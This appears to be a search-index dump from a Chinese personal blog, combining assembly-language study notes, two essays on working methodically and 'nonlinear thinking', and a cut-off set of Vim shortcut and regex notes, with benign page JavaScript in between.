指令助记符 助记符 说明 助记符 说明 mov 分配 mul 相乘 add 相加 jmp 跳转 sub 相减 call 调用 操作数 示例 类型 96 常量 2+4 表达式 eax 寄存器 count 内存 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:9:7","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"执行过程 编辑: 编辑源文件 汇编: 读取源文件 -\u003e 目标文件 链接: 读取并检查目标文件,链接器从链接库复制被请求的过程,与目标文件融合 -\u003e 可执行文件 运行: 运行 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:9:8","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"定义数据 内部数据类型 类型 用法 BYTE 8 位无符号整数，B 代表字节 SBYTE 8 位有符号整数，S 代表有符号 WORD 16 位无符号整数 SWORD 16 位有符号整数 DWORD 32 位无符号整数，D 代表双（字） SDWORD 32 位有符号整数，SD 代表有符号双（字） FWORD 48 位整数（保护模式中的远指针） QWORD 64 位整数，Q 代表四（字） TBYTE 80 位（10 字节）整数，T 代表 10 字节 REAL4 32 位（4 字节）IEEE 短实数 REAL8 64 位（8 字节）IEEE 长实数 REAL10 80 位（10 字节）IEEE 扩展实数 伪指令 类型 用法 DB 8 bytes DW 16 bytes DD 32 bytes DQ 64 bytes DT 80 bytes 多初始值 DUP 为多个数据分配空间 byte 20 dup(0) ","date":"2021-12-22","objectID":"/zh-cn/23-1/:9:9","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"数据传送、寻址和算术运算 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:10:0","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"操作数 立即数: 数字文本表达式 寄存器操作数: CPU内已命名的寄存器 内存操作数: 引用内存位置 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:10:1","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"MOV mov des src 原则: 操作数大小相同 不能同时为内存操作数 指令指针寄存器不能作为目标操作数 *不能将数据从一个内存位置传送到另一个内存位置* ","date":"2021-12-22","objectID":"/zh-cn/23-1/:10:2","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"整数的扩展 无符号扩展 – MOVZX 全零扩展并传送: 将源操作数复制到目的操作数,并把目的操组数扩展到16或32位. 有符号扩展 – MOVSX 符号扩展并传送: 将源操作数复制到目的操作数,并把目的操组数扩展到16或32位. ","date":"2021-12-22","objectID":"/zh-cn/23-1/:10:3","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"数据交换 – XCHG xchg des src *处理不能使用立即数操作外,和MOV指令要求一致* ","date":"2021-12-22","objectID":"/zh-cn/23-1/:10:4","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"加减法 INC \u0026\u0026 DEC INC: 寄存器或内存操作数加一 DEC: 寄存器或内存操作数减一 *INC和DEC不影响进位标志* ADD – 相加 add des src 规则和MOV指令相同 *源操作数不变* SUB – 相减 sub des src 规则和MOV指令相同 *源操作数不变* NEG – 非(将操作数转化为其二进制补码) neg des src 规则和MOV指令相同 *源操作数不变* ","date":"2021-12-22","objectID":"/zh-cn/23-1/:10:5","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"运算符和伪指令 OFFSET: 返回变量和其所在段起始地址之间的距离 PTR: 重写操作数默认的大小类型 TYPE: 返回一个操作数或者数组中每个元素的大小 LENGHOF: 返回数组中元素的个数 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:10:6","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"JMP和LOOP JMP – 无条件跳转到目的地址 jmp des 世界上最浪漫的话 jmp 0x7C00 LOOP – 循环 ECX计数器循环 loop des 首先将ECX置于合适的值,每循环一次,ECX自动减一并与0对比是否相等,若等于零则退出循环 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:10:7","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"过程 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:11:0","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"运行时堆栈(32位) 入栈 栈顶指针减4 ESP寄存器指向最后压入堆栈的数据项 内存中是从高地址向低地址扩展的 出栈 从堆栈删除数据 栈顶指针增加 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:11:1","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"PUSH \u0026\u0026 POP PUSH 减少ESP的值 将源数据复制到堆栈(16位减2,32位减4) POP 增加ESP的值 将数据从堆栈复制到目的操作数(16位减2,32位减4) ","date":"2021-12-22","objectID":"/zh-cn/23-1/:11:2","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"条件分支 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:12:0","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"布尔操作 操作 说明 AND 源操作数和目的操作数进行逻辑与操作 OR 源操作数和目的操作数进行逻辑或操作 XOR 源操作数和目的操作数进行逻辑异或操作 NOT 对目标操作数进行逻辑非操作 TEST 源操作数和目的操作数进行逻辑与操作，并适当地设置 CPU 标志位 *TEST指令不修改目标操作数* ","date":"2021-12-22","objectID":"/zh-cn/23-1/:12:1","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"CMP指令 CMP指令执行从目的操作数中减去源操作数的隐含减法操作且不修改任何操作数 比较无符号数 CMP结果 ZF CF 目的操作数\u003c源操作数 0 1 目的操作数\u003e源操作数 0 0 目的操作数=源操作数 1 0 比较有符号数 CMP结果 标志位 目的操作数\u003c源操作数 SF != OF 目的操作数\u003e源操作数 SF == OF 目的操作数=源操作数 ZF == 1 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:12:2","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"条件跳转 基于特定标志的跳转 助记符 说明 标志位/寄存器 助记符 说明 标志位/寄存器 *JZ* 为零跳转 ZF=1 JNO 无溢出跳转 OF=0 *JNZ* 非零跳转 ZF=0 JS 有符号跳转 SF=1 JC 进位跳转 CF=1 JNS 无符号跳转 SF=0 JNC 无进位跳转 CF=0 JP 偶校验跳转 PF=1 JO 溢出跳转 OF=1 JNP 奇校验跳转 PF=0 基于相等性的比较 助记符 说明 *JE* 相等跳转 (leftOp=rightOp) *JNE* 不相等跳转 (leftOp M rightOp) JCXZ CX=0 跳转 JECXZ ECX=0 跳转 JRCXZ RCX=0 跳转（64 位模式） 无符号的比较 助记符 说明 助记符 说明 *JB* 小于跳转（若 leftOp 小于 rightOp） *JA* 大于跳转(若 leftOp \u003e rightOp) JNBE 不小于或等于跳转（与 JA 相同） JNAE 不大于或等于跳转（与 JB 相同） JAE 大于或等于跳转（若 leftOp ≥ rightOp） JBE 小于或等于跳转（若 leftOp ≤ rightOp） JNB 不小于跳转（与 JAE 相同） JNA 不大于跳转（与 JBE 相同） ","date":"2021-12-22","objectID":"/zh-cn/23-1/:12:3","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"整数运算 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:13:0","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"逻辑移位和算术移位 逻辑移位: 空出来的位用0填充 算术移位: 空出来的位用原数据符号位填充 指令 作用 指令 作用 *SHL* 左移 *ROR* 循环右移 *SHR* 右移 *RCL* 带进位的循环左移 *SAL* 算术左移 *RCR* 带进位的循环右移 *SAR* 算术右移 SHLD 双精度左移 *ROL* 循环左移 SHRD 双精度右移 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:13:1","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"乘法和除法 无符号乘法 – MUL 指令 有符号乘法 – IMUL 指令 无符号除法 – DIV 指令 有符号除法 – IDIV 指令 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-22","objectID":"/zh-cn/23-1/:13:2","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["杂项"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 事情总是做不完、一切毫无头绪、日子过得毫无条理……哪些瞬间你会觉得，自己的生活简直就是一团麻？ 事情总是做不完、一切毫无头绪、日子过得毫无条理……哪些瞬间你会觉得，自己的生活简直就是一团麻？讲真，你自认为是个做事情有章法的人吗？ 做编导策划之前，我曾在一家中外合资的研究所做过近一年的咨询。教授在工作邮件中多次对我说，“和你一起工作的，大多都是来自清华的高材生，你不要感到有任何的压力。有些工作难度可能比你想象的大，希望你有信心。” 一开始我不解，因为教授非常欣赏我对于新技能的应用，从文字处理到视觉表达，我总有新奇的点子和方法，所以包揽了几个大型项目的演示文稿转化和设计。我想在我的能力范围内，事情能够困难到哪里去？ 然而，我最主要的工作并不是做几个 PPT 或者做一两张图，而是在全网以及图书资料当中搜集关于我们研究的类别所有的信息，然后做数据的整理、分析，并且为每一个对象填写一份几百字的报告（ 几百个对象 ）。 慢慢地我发现，我引以为傲的各种技能在这里根本就用不上，以至于我开始觉得工作量严重超过负荷。 每天早上六点左右，我开始抱着笔记本做检索。吃饭这件事情我笑称自己是“续命”，所以到现在我都不记得那段期间吃过些什么。可是到了凌晨两三点 ，我绝望地发现，我的 Excel 表格上还只有可数的几十行数据…… 更惨的是，由于超负荷的工作状态，时间和精力完全不够用，在另一项工作当中，我继续受挫—— 大概 150 页的基础文字 PPT ，需要把它们中的内容全部转化成图表，并且统一好排版。别说那个时候我还没听说过秋叶或许岑，即便听过、学过，两位大神也救不了我（当然不是说他们的教程不好，从技能层面上，是值得学习的 ），因为这部分工作 70% 的精力在脑子里，而不是手上。 如果现在回过头去评价当初的状态，我只能说是勉强完成工作。后来我自己做了个总结： 第一，技能本身会随着从事行业、所做项目的不同而发生变化，你的发展潜力、职业收入、晋升机会可能因为技能而发生改变，但它绝不可能成为决定性的因素；相反，如果你的信息搜集、整合和处理能力能够融会贯通的话，也会促进你对新技能的理解能力，进而提高你的技能达成效率。 第二，正是近一年的信息搜集、整合和处理能力的训练，让我的新事物认知能力和表述能力有了几倍提升。从而让我在后来策划和导演工作中，可以说游刃有余。最明显的一点是，作为内向者，能够借由认知能力和表述能力与客户顺畅地沟通策划方案，而不是借由所谓的演讲技巧。 第三，我超负荷工作状态的直接原因是做事情没有章法，这直接导致工作效率极其低下。这个章法来自于在开始一个项目之前，从全局去认识它的客观规律，从而设计出最优的执行方案；在一个项目执行中，有条理、有逻辑地完成任务清单，不轻易改变决定和方向，等等。 但我想，关于做事章法的问题和答案远不止于此。所以，今天，我最想和大家讨论的就是—— 你做事情有章法吗 ？ 如果你愿意的话，请在这里分享你的经验、经历或者困惑。此前已经形成的报告参见《做事有条理谈不上有章法，后者需要非线性思维》。 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-22","objectID":"/zh-cn/23/:0:0","tags":["杂项"],"title":"事情总是做不完、一切毫无头绪、日子过得毫无条理……哪些瞬间你会觉得，自己的生活简直就是一团麻？","uri":"/zh-cn/23/"},{"categories":["杂项"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 如何才算有章法？什么是非线性思维？有条理和有章法是一件事吗？ # 如何才算有章法？什么是非线性思维？有条理和有章法是一件事吗？ 毫无疑问，大多数人做事都有条理，至少知道如何有条理，比如学习时间管理、创建任务清单、培养更好的执行力。几乎每个人都可以清晰地罗列出自己的目标和计划，并且清楚地知道，要达到目的，需要怎么做，需要注意些什么。但最终，你都可能力不从心、难以坚持、混乱、被打断、半途而废……以至失败。为什么会这样？原因大致如下： ①人们误以为有条理、有执行力就能成事，然而“有章法”和“有条理”是两件完全不同的事情；②客观世界是非线性的，我们却因为数百万年的教化习惯于用线性思维去揣度万物，包括待处理的事件；③人们误以为“成功”的意思等于“达到目的”，然而从没有人真正达到过目的，“完美”并不存在；④如果你手里有一把锤子，所有东西看上去都像钉子。 ","date":"2021-12-19","objectID":"/zh-cn/22/:0:0","tags":["杂项"],"title":"如何才算有章法？什么是非线性思维？有条理和有章法是一件事吗？","uri":"/zh-cn/22/"},{"categories":["杂项"],"content":"（一）你只是有“条理”，谈不上有“章法”。 先解决这个问题：什么是“章法” ？ 明代书画家董其昌在《画禅室随笔》中说，“古人论书以章法为一大事，盖所谓行间茂密是也。” 章法原意是指在整个作品当中，字与字、行与行之间的相互呼应、相互照顾，后被引申为处理事情的规则和办法。被引申后，人们莫名其妙地就把章法和条理混为一谈了。 如果你是某书法家，当你写出一幅字，是希望听到别人说，“你的字很有条理”，还是希望听到别人说，“你的字很有章法” 呢？ 当然是后者。所以在本文中，不管是书法还是做事，“有章法”跟“有条理”是完全不同的两个概念。 在另外一个地方，我们也经常听到“章法”二字，那就是下棋。 现实生活中，当我们准备达到某个目的，结果是成与不成。它的实质根本不在于计划好某一条路径，并沿着这条路径直达目的地。而是像下棋一样，不同玩家与不同规则、玩法的相互影响，让所有的进攻和防守路径都变成复杂的网状结构。最终你走出来的那条路，不过是复杂网状结构中的一条。 不信试着站在结果看开端：比如说，半年前你准备减肥，但现在失败了。你试试列出所有你当初规划的任务清单，再列出所有让你失败的因素清单。结果往往大大出乎你的意料。 半年前，你准备了每周几练的计划，并且做好了食谱和购物清单，准备每天定时打卡，为此不惜在朋友圈发毒誓，在朋友那里压了 5000 块钱，声称不成功那 5000 块就当白送了。结果，果然，你减肥失败。 你列出失败的因素发现：有一次没打卡是因为好朋友约了去喝酒；还有一次是工作不得不熬夜加班；另外一次是突然阑尾炎，动了个小手术；中途突然遇到了真爱，谈了个朋友，后来发现真爱是人渣…… 所以有时候成功与失败的因素，和你的计划相差甚远，因为，成功达到目的的过程是复杂路径组合而成的网状结构，并不是一条单一路径。然而，人们总是简单地看作一条规划路径而已。为什么会这样？ 因为世界是非线性的，而我们的思维多数时候是线性的。 ","date":"2021-12-19","objectID":"/zh-cn/22/:0:2","tags":["杂项"],"title":"如何才算有章法？什么是非线性思维？有条理和有章法是一件事吗？","uri":"/zh-cn/22/"},{"categories":["杂项"],"content":"（二）世界是非线性的 一个系统，如果它的输入与输出不成正比，我们就说它是非线性的，就是说，两个变量间的数学关系不是直线，而是曲线、曲面甚至其他不确定的属性，而不是简单的比例（线性）关系。就像我们刚才说的，完成一件事情所需要做到事情和所需要达到的目的之间的关系，不是正比关系。 **说人话就是：**不是努力越多就能得到越多回报；也不是计划越好就越能成功；更不是执行力越强就越能成事。因为当我们说出这些话的时候，是假定其他变量不变的。 比如，当我们说努力越多就得到越多回报，不止要假设你的计划很好、你的执行力很强、你记忆力很棒，还要假设你身体素质好，不会突然阑尾炎；假设你不会遇到你的男朋友，并且不会因为感情的事情影响你的计划，假设他不是渣男；还要假设你不会遇到路上有小偷突然偷了你的电脑，导致你的计划和方案全都不见了……对于一个非线性系统，哪怕一个小扰动，哪怕初始条件的一个微小改变，都可能造成系统在往后时刻行为的巨大差异。 这就是现实世界，真实的非线性世界。 现实世界的规律是如此地非线性、如此地复杂多变，而我们却没有做好应对的准备。 ","date":"2021-12-19","objectID":"/zh-cn/22/:0:3","tags":["杂项"],"title":"如何才算有章法？什么是非线性思维？有条理和有章法是一件事吗？","uri":"/zh-cn/22/"},{"categories":["杂项"],"content":"（三）线性思维，智慧的诅咒 当我们问，1+1 等于多少的时候，你会脱口而出，等于 2。 当你用同样的问题问计算机时，它会说是 10。 为什么等于 2 ？因为十进制；为什么等于 10 ？ 因为二进制。如果还有八进制、十六进制、三十二进制呢 ？ 所以，规则是人类定的； 那为什么 1 是 1 呢？ 什么契机下，罗马人的 [ Ⅰ ] 和中国人的 [ 壹 ] 以及英国人的 [ one ] ，最终走到了一起呢？ ————— 事实上，阿拉伯数字是由古印度人在大约公元 500 年前后发明的，据说发明人是天文学家阿叶彼海特。后来由阿拉伯人传向欧洲，再由欧洲人现代化。在此之前，数字并不统一、进制也并不统一。 比如，当我们说两个人“半斤八两”的时候，并不是说，一个人半斤，一个人八两，而是两个人都是半斤。因为秦统一六国时所用的进制便是十六进制。一斤等于十六两，半斤等于八两。 所以，数字是人规定的、规则是人规定的，这些都是人为了把握客观规律，取客观事物的一部分，把它看作近似的线性来研究、来使用。 比如我们必须给客观事物统一名称，才能够以大家都能理解的方式共同表达，否则当你指着一头鹿告诉大家这是马的时候，你不是赵高转世就是神经病投胎。 又比如，人的思想和知识结构类似于我们的神经血管、大多时候都是网状的、立体的、变化的，但如果要说出让人能够理解的思想，或者写出让人易于理解的书，就必须把网状的思维抽出一条线表达出来，这种结果就是，你所表达出来的，并不能代表你的思想。 同样的，你听别人说的话、看别人写的书，所接受的也不全是对方的思想，而只是一根被抽出来的丝而已。很多作者深谙此道，所以总结出无数”折磨读者的秘密“；很多做广告做营销的人也深谙此道，所以乐此不疲。举个例子，以下是两种表达方式—— 问：我怎么才能成功？ 答：首先，你应该确立你的目标；其次，你性格懦弱，这很影响；再次，你的能力相对于你的目标还差得远，得练；还有，你的思维能力不行，还得补；另外…… 问：MMP。 问：我怎么才能成功？ 答：你需要有创新思维。 问：那怎么办？ 答：报名xxx课。 问：好！ 第一种方式显然更接近真相，更接近非线性的客观现实。但很不幸，大部分人都容易接受第二种方式。仔细想想，和算命也没什么两样。 问：大师，我怎么才能成功？ 答：你命里缺木。 问：那怎么办？ 答：改名。 问：好！ 再比如，我们出生以来不断习得各种能力，可如果将我们扔进原始森林，我们的连刚出生的一只普通动物都不如。 任何事物都有两面，智慧也是这样。就像柏拉图说，身体是灵魂的监狱。在我看来，语言、文字和规则虽然是思想的载体，它也是思想的囚笼。 马斯洛有一句经典名言：如果你手里有一把锤子，所有东西看上去都像钉子。数百万年前，我们的祖先开始以线性思维来研究整个非线性世界，他们的后代不断习得这种线性思维能力，时间长了，习惯性地用线性思维去思考和判断这个非线性的世界。 我们手握线性思维这把锤子，放眼望去，所有事情都是钉子。 ","date":"2021-12-19","objectID":"/zh-cn/22/:0:4","tags":["杂项"],"title":"如何才算有章法？什么是非线性思维？有条理和有章法是一件事吗？","uri":"/zh-cn/22/"},{"categories":["杂项"],"content":"（四）什么是非线性思维？ 对于线性思维，人们的定义是， 思维沿着一定的线型或类线型（无论线型还是类线型的既可以是直线也可以是曲线）的轨迹寻求问题的解决方案的一种思维方法。相较而言的非线性思维的定义就比较流氓了：一切不属于线性思维的思维类型都属于非线性思维，也就是我们所见到的跳跃性思维，比如系统思维、模糊思维等。事实上，它至今都没有科学的定义，甚至和科学不沾边。 非要下个定义的话，它是以冷静的宇宙观，多维度地认识万物运作的规律和机制的思考方式。 它不只是需要跳出框外思考（ think out of the box ），更是去主动揣摩事物本质。非线性是一种更加接近自然、接近实际的思维和研究方式。 —————– **首先，它绝不一定是符合逻辑的。**人的思维形式本身就是逻辑和非逻辑的结合，比如梦境也是一种思维形式。不同的人所遵照的所谓逻辑也不过是某些规则作用的结果，符合某一种逻辑，说不定会与另一种逻辑相悖。 比如，不输掉一盘棋，最好的方式是什么？对，不下这盘棋。如果你在规则之中，你会苦思冥想，杀死无数脑细胞。但跳出这个框，你会发现，题目只是问你，如何才能不输掉，而不是如何才能赢。这个可以说是直觉思维，也可以说是逆向思维，还可以说是发散思维。 —————– 其次，站在全局看看，你会发现三个不可能：你不可能确定所有事，你不可能做完所有事，你不可能达到原本的目的。 **你不可能确定所有的事：**在你的所有计划中，你只能确定你能做出一个理想化的计划，以及尽量去确定自己是一个不懒惰、有毅力的人，但你不可能确定你将可能遇到一场暴雨、一个小偷、一段恋情或者一个贵人。你该做什么？做两件事情：①尽量去确定不确定。②偶尔把确定的事情搞得不确定。因为在非线性的客观世界中，虽然变量与变量之间的路径不一定，但是你越确定一些事情，变量就会变成定量，未知数越少，路径越清晰。这道理应该容易理解。什么叫让确定的事情不确定呢？在下棋的过程中，当遇到赌局或者死局的时候，一般人会急于找出制胜关键，而高手职业高手会聪明地选择转身，置之死地而后生，就是这个道理。如果你要达到的目标到了最后关头，确定可能会以失败而告终，不妨试试能不能把一些确定的因素变得不确定。这大概也能称为逆向思维之类的思维吧。 **你不可能做完所有的事：**成功达到目的的过程是复杂路径组合而成的网状结构，并不是一条单一路径，所以，做好计划并列出清单，每天按时按量完成每一个任务是一件特傻的事情——你要做的，是把事情按照轻重缓急全部列出来，不管是什么四象限法则还是简单列个清单，从最重要的一两件事情开始做，做完就好。其他事情没做完怎么办？没做完就没做完。因为你的能力、你的时间，以及任何意外情况，都是你整个过程所有路径的影响因素之一。考虑进去你就该知道，你不可能做完所有的事情。其实，你一定听过二八原则，最重要的只有那 20% 。 **你不可能达到原本的目的：**在话题当中，有朋友留言说，自己有时候钻入细节，忘了全局，又或者完美主义。事实上这种完美主义或者细节控是多此一举的。在现实世界中，没有任何的完美。不止如此，不论你最终是否成功，你根本就不可能达到原本的目的。所谓棋局中的胜败，也不过是人们定下的规矩。现实生活中，没有对错、没有胜败，也没有 100% 地完成某件事。大多创业公司成功之后都会发现，他们所达到的成就与原先的规划早就不是一个东西。 ","date":"2021-12-19","objectID":"/zh-cn/22/:0:5","tags":["杂项"],"title":"如何才算有章法？什么是非线性思维？有条理和有章法是一件事吗？","uri":"/zh-cn/22/"},{"categories":["杂项"],"content":"（五）如何用到非线性思维？ 说到非线性思维可能比较虚幻，没有场景感。不过除了书法、下棋这样的例子，还有一个比较典型。 在电影、电视节目出现的漫长时间里，视频的编辑方式非常老土——在一盘空白磁带上把素材连接成新的连续画面，如果中间某一段出现错误，想要删除或者修改它根本不可能。怎么做呢？从错误的那一段开始到后面的所有画面重新抹掉，返工。如果你用过以前的磁带翻录音乐，大致也就是如此，不过视频比音乐痛苦千百倍。这种低效率的编辑方式，我们称为“线性编辑”。 “非线性编辑”有多牛逼呢？ 除了所有的素材内容数字化，不需要挨个苦逼找素材之外，所有素材、效果都被放在一个面板当中，随意拖动、剪辑、替换、叠加。即便中间出现错误也没什么，把错误的地方找出来，替换掉就好了。 在非线性编辑中，我们不再被时间、空间所限制，也可以无视原本的规则和逻辑，将所有的视频、音乐、图片、字幕、特效以最优的方式组合起来，最终生成你想要的作品。 视频剪辑的软件界面、书法所用的宣纸、下棋所用的棋盘，实质上是一个道理。要做到非线性，就需要打破原来的线性想法，为你的所要达到的目标谋篇布局，做出章法，必要时，跳出规则。 —————— 友情提醒 ： 人始终是人本位的。思考的时候你可以天马行空，行动的时候，你必须脚踏实地。 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-19","objectID":"/zh-cn/22/:0:6","tags":["杂项"],"title":"如何才算有章法？什么是非线性思维？有条理和有章法是一件事吗？","uri":"/zh-cn/22/"},{"categories":["编辑器","Vim"],"content":"此文为加密收费内容添加我微信支付后可看: $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # vim的笔记 ","date":"2021-12-19","objectID":"/zh-cn/21/:0:0","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"vim简介 略 总之就是非常好用且效率高 建议自己谷歌 ","date":"2021-12-19","objectID":"/zh-cn/21/:1:0","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"常用简写 简写 原意 w word b back ctrl+v 可视 ctrl + v 块模式 zz 切换成中心位置 ciw/ci’ change in word/change in ‘’ shift +i/a 在行首/行尾插入 (ctrl + v选中多行) +$/0 + shift + i/a 在多行行首/行尾插入 f find d3 删除三个字符 sr 打开分屏 ctrl + w + h/l 切换成左/右分屏 v : normal A/I 对模块行首/行尾添加 ctrl + o 回到上一个位置 :w ! sudo tee % 强制保存 s 光标所在行 .,$s 光标所在行到行末 ","date":"2021-12-19","objectID":"/zh-cn/21/:2:0","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"宏 简单来说,就是把需要执行的操作录制下来,交给vim 命令 含义 q寄存器名 开始录制,并保存在某寄存器中 操作 被录制的操作 次数@寄存器名 执行某寄存器的命令一定的次数 ","date":"2021-12-19","objectID":"/zh-cn/21/:3:0","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"正则 ","date":"2021-12-19","objectID":"/zh-cn/21/:4:0","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"magic 这是一个用来规定哪些元字符需要+’\\‘东西 magic (\\m)：除了$ . * ^ 之外其他元字符都要加反斜杠。 nomagic (\\M)：除了 $ ^ 之外其他元字符都要加反斜杠。 两个例子 /\\m.* # 查找任意字符串 /\\M.* # 查找字符串 .* （点号后面跟个星号） v(very magic) \\v （very magic）：任何元字符都不用加反斜杠 \\V （very nomagic）：任何元字符都必须加反斜杠 几个例子 /\\v(a.c){3}$ # 查找行尾的abcaccadc /\\m(a.c){3}$ # 查找行尾的(abc){3} /\\M(a.c){3}$ # 查找行尾的(a.c){3} /\\V(a.c){3}$ # 查找任意位置的(a.c){3}$ 其实默认就好,默认为magic的设置 ","date":"2021-12-19","objectID":"/zh-cn/21/:4:1","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"元字符 元字符 说明 . 匹配任意一个字符,如p*p可以匹配字符串pep, pip或者pcp [abc] 匹配方括号中的任意一个字符。可以使用-表示字符范围 [a-z0-9] 匹配小写字母和阿拉伯数字 [^abc] 在方括号内开头使用^符号，表示匹配除方括号中字符之外的任意字符 \\d 匹配阿拉伯数字，等同于[0-9] \\D 匹配阿拉伯数字之外的任意字符，等同于[^0-9] \\x 匹配十六进制数字，等同于[0-9A-Fa-f] \\w 匹配单词字母，等同于[0-9A-Za-z_] \\W 匹配单词字母之外的任意字符，等同于[^0-9A-Za-z_] \\t 匹配\u003cTAB\u003e字符 \\s 匹配空白字符，等同于[ \\t] \\S 匹配非空白字符，等同于[^ \\t] \\a 所有的字母字符. 等同于[a-zA-Z] \\l 小写字母[a-z] \\L 非小写字母[^a-z] \\u 大写字母 [A-Z] \\U 非大写字幕[^A-Z] ","date":"2021-12-19","objectID":"/zh-cn/21/:4:2","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"需要转义的元字符: 原字符 转意 * * . . / / \\ \\ [ [ ","date":"2021-12-19","objectID":"/zh-cn/21/:4:3","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"量词 命令 意义 * 匹配0个或多个(匹配优先) \\+ 匹配1个或多个(匹配优先) \\{n,m} 匹配n个到m个(匹配优先),如\\d{1, 3}可以匹配1到3个数字,类似11, 1, 333 \\{n,} 最少n个(匹配优先) \\{,m} 最多m个(匹配优先) \\{n} 恰好n个 ","date":"2021-12-19","objectID":"/zh-cn/21/:4:4","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"位置 字符 含义 $ 